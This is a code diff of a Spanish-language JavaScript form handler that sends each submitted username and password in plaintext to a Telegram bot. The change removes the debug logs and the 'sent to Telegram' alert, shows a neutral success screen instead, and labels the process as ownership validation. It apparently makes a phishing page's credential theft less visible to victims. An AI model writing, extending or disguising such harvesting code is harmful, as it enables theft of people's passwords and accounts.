@@ -1,4 +1,6 @@
 const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
 
 formulario.addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -7,6 +9,7 @@ formulario.addEventListener('submit', async (e) => {
     const contraseña = formulario.contraseña?.value || "";
     const confirmar = formulario.confirmar?.value || "";
 
+    // Verificar que las contraseñas coinciden
     if (contraseña !== confirmar) {
         alert("Las contraseñas no coinciden.");
         return;
@@ -20,12 +23,7 @@ formulario.addEventListener('submit', async (e) => {
     const mensaje = `🚀 Nuevo Registro:\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contraseña}`;
 
     try {
-        // Imprimir los datos para depuración
-        console.log(`Enviando mensaje a Telegram con los siguientes datos:`);
-        console.log(`Bot Token: ${BOT_TOKEN}`);
-        console.log(`Chat ID: ${CHAT_ID}`);
-        console.log(`Mensaje: ${mensaje}`);
-        
+        // Enviar mensaje a Telegram
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -40,16 +38,22 @@ formulario.addEventListener('submit', async (e) => {
 
         // Si la respuesta no es exitosa, lanza un error
         if (!response.ok) throw new Error(`Error: ${response.status} - ${response.statusText}`);
-        
+
         const data = await response.json();
-        
-        // Imprime la respuesta para depuración
+
+        // Imprimir la respuesta para depuración
         console.log('Respuesta de Telegram:', data);
-        
-        alert("Datos enviados correctamente a Telegram");
+
+        // Mostrar mensaje de éxito y ocultar formulario
+        registro.classList.remove('activo');
+        exito.classList.add('activo');
+
+        // Limpiar el formulario
+        formulario.reset();
 
     } catch (error) {
-        console.error("Error al enviar mensaje a Telegram:", error);
+        console.error("Error al Validar Titularidad:", error);
         alert("Hubo un error al enviar los datos.");
     }
 });
+
